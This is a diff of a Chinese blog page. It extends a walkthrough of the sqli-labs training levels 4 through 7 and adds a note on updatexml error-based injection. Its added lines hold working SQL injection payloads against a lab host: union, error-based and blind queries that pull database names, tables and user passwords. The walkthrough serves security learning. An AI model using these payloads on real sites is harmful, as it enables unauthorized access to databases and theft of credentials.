@@ -185,10 +185,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2023-10-14 12:29:51 / 修改时间：15:06:28" itemprop="dateCreated datePublished" datetime="2023-10-14T12:29:51+08:00">2023-10-14</time>
+              <time title="创建时间：2023-10-14 12:29:51" itemprop="dateCreated datePublished" datetime="2023-10-14T12:29:51+08:00">2023-10-14</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-10-17 11:47:10" itemprop="dateModified" datetime="2023-10-17T11:47:10+08:00">2023-10-17</time>
+              </span>
 
           
 
@@ -330,7 +336,55 @@
 <p><code>http://sqli-labs:8080/Less-4/?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;-- s</code></p>
 <p>爆出敏感信息：</p>
 <p><code>http://sqli-labs:8080/Less-4/?id=-1&quot;) union select 1,2,group_concat(username,password) from users-- s</code></p>
-<h3 id="sqli-labs第五关"><a href="#sqli-labs第五关" class="headerlink" title="sqli-labs第五关"></a>sqli-labs第五关</h3>
+<h3 id="sqli-labs第五关"><a href="#sqli-labs第五关" class="headerlink" title="sqli-labs第五关"></a>sqli-labs第五关</h3><p>这关开始就与上面不一样了，我们输入后界面并不会出现查询结果。</p>
+<img src="/2023/10/14/sqli-labs/image-20231017094252379.png" class="" title="image-20231017094252379">
+
+<p>但是会有报错显示</p>
+<img src="/2023/10/14/sqli-labs/image-20231017100107567.png" class="" title="image-20231017100107567">
+
+<p>根据显示的报错结果，我们可以判断为单引号闭合。</p>
+<p>这里使用报错注入。</p>
+<p>输入：<code>?id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- s</code></p>
+<img src="/2023/10/14/sqli-labs/image-20231017100810198.png" class="" title="image-20231017100810198">
+
+<p>成功爆出数据库的名字。</p>
+<p>输入：<code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) -- s</code></p>
+<img src="/2023/10/14/sqli-labs/image-20231017102905016.png" class="" title="image-20231017102905016">
+
+<p>成功爆出表名。</p>
+<p>查询表中的列名：<code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1) -- s</code></p>
+<img src="/2023/10/14/sqli-labs/image-20231017103826067.png" class="" title="image-20231017103826067">
+
+<p>查询username和passwor：</p>
+<p><code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) -- s</code></p>
+<p><code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) -- s</code></p>
+<img src="/2023/10/14/sqli-labs/image-20231017104151512.png" class="" title="image-20231017104151512">
+
+<img src="/2023/10/14/sqli-labs/image-20231017104240409.png" class="" title="image-20231017104240409">
+
+
+
+<h3 id="sqli-labs第六关"><a href="#sqli-labs第六关" class="headerlink" title="sqli-labs第六关"></a>sqli-labs第六关</h3><p>这关跟第五关没有多大区别，只不过是闭合方式由单引号换为了双引号。剩下的操作方式与第五关一致，这里不多撰述。</p>
+<h3 id="sqli-labs第七关"><a href="#sqli-labs第七关" class="headerlink" title="sqli-labs第七关"></a>sqli-labs第七关</h3><p>根据题目提示可知，这关需要用到文件导入的方式。</p>
+<p>不过不管需要用到什么方法，第一步还是要判断注入点。</p>
+<p>这关没有报错回显，但是报错和正常的回显不同，我们可以一个个尝试。</p>
+<p>可以知道闭合方式为 ‘))</p>
+<p><font color='red'>注：使用前提：1、用户权限足够高，尽量具有root权限。2、secure_file_priv不为NULL</font></p>
+<p>这里可以使用之前的联合注入</p>
+<p>但是如果尝试就会发现，这里会给我们报错。即使我们的sql语句没有问题。</p>
+<p>原因是因为mysql配置文件对导入导出的文件路径进行了限制。</p>
+<p>因此这里最好还是使用盲注。</p>
+<p>对于没有报错回显和成功回显的类型来说。</p>
+<p>我们第一步需要判断数据库名的长度。</p>
+<p><code>?id=1&#39;)) and length(database())=7 -- s</code></p>
+<img src="/2023/10/14/sqli-labs/image-20231017113442695.png" class="" title="image-20231017113442695">
+
+<img src="/2023/10/14/sqli-labs/image-20231017113456596.png" class="" title="image-20231017113456596">
+
+<p>可以判断数据库名字符长度为8</p>
+<p>第二步就是利用ascill码来猜测数据库名</p>
+<p><code>?id=1&#39;)) and ascii(substr(database(),1,1))=115 -- s</code></p>
+
       
     </div>
 
@@ -380,7 +434,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-10-14 11:26:12" itemprop="dateModified" datetime="2023-10-14T11:26:12+08:00">2023-10-14</time>
+                <time title="修改时间：2023-10-17 09:59:29" itemprop="dateModified" datetime="2023-10-17T09:59:29+08:00">2023-10-17</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -408,7 +462,6 @@
 <h4 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h4><p>   知道了什么是SQL注入，我们接下来就要考虑如何通过SQL注入来进行攻击。前面说过，当我们访问动态网页时，Web服务器会向数据访问层发起SQL查询请求，验证通过，就会执行SQL语句。几乎所有的Web应用都在后台使用着某种数据库。</p>
 <p>​    网站内部直接发送的SQL请求一般不会有什么风险，但是大多数情况下，网站会将用户的输入动构造在SQL语句中，我们就可以在输入中故意插入恶意的SQL代码片段，此时，网站会将我们的输入与原始的SQL语句进行拼接，这就会照成原始的SQL语句出现问题。如果此时Web应用又没有对我们的输入进行审查，就会带来意想不到的问题。</p>
 <p>​     以上我们可以总结出SQL注入产生的条件：传递给后端的参数是可控的，参数内容会被带入到数据库查询，变量未存在过滤或者过滤不严谨。</p>
-<p><img src="/SQL%E6%B3%A8%E5%85%A5/1.png" alt="1"></p>
 <h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>我们要查询姓名为李四的数据</p>
 <p>正常开发人员的操作是：</p>
 <p><code>select * from users where name = &#39;李四&#39;;</code></p>
@@ -425,7 +478,7 @@
 <p>3.根据注入参数类型，判断SQL语句</p>
 <p>4.爆出表名，及数据库的相关信息</p>
 <p>5.获取账户信息，攻击Web或为下一步攻击进行准备</p>
-<h4 id="SQL注入类型"><a href="#SQL注入类型" class="headerlink" title="SQL注入类型"></a>SQL注入类型</h4><p><img src="/SQL%E6%B3%A8%E5%85%A5/1657765090_62cf7ce22bc5cb101dc1b.png"></p>
+<h4 id="SQL注入类型"><a href="#SQL注入类型" class="headerlink" title="SQL注入类型"></a>SQL注入类型</h4><p><img src="/SQL%E6%B3%A8%E5%85%A5/1657765090_62cf7ce22bc5cb101dc1b.png" alt="img"></p>
 <h4 id="SQL注入危害"><a href="#SQL注入危害" class="headerlink" title="SQL注入危害"></a>SQL注入危害</h4><p>1.数据库信息泄露</p>
 <p>2.网页被恶意篡改</p>
 <p>3.数据库被恶意操作</p>
@@ -443,6 +496,12 @@
 <p>例如：<a target="_blank" rel="noopener" href="http://sqli-labs:8084/Less-1/?id=1%E2%80%98">http://sqli-labs:8084/Less-1/?id=1‘</a></p>
 <p>此时后台语句：<code>&quot;select 123 from users where id=&#39;1&#39;’&quot;</code></p>
 <p>会发现多了一个单引号，数据库无法处理，于是会报错，证明这条语句成功被带进数据库查询,存在字符型注入。</p>
+<h4 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h4><p><strong>updatexml报错注入</strong>：</p>
+<p><code>updatexml(xml_doument,XPath_string,new_value)</code><br><code>第一个参数：XML的内容</code><br><code>第二个参数：是需要update的位置XPATH路径</code><br><code>第三个参数：是更新后的内容</code></p>
+<p>第一个和第三个参数可以随便写，主要利用的是第二个参数。</p>
+<p>当我们第二个参数输入的是非XPATH格式时，函数就会报错，会给我们爆出输入的第二个参数的相关信息。</p>
+<p>也就是说，只需要让第二个参数的数据全部校验失败就行。</p>
+<p>而为了保证全部校验失败，只需要在第二个参数前加上无法通过校验的符号即可。</p>
 
       
     </div>
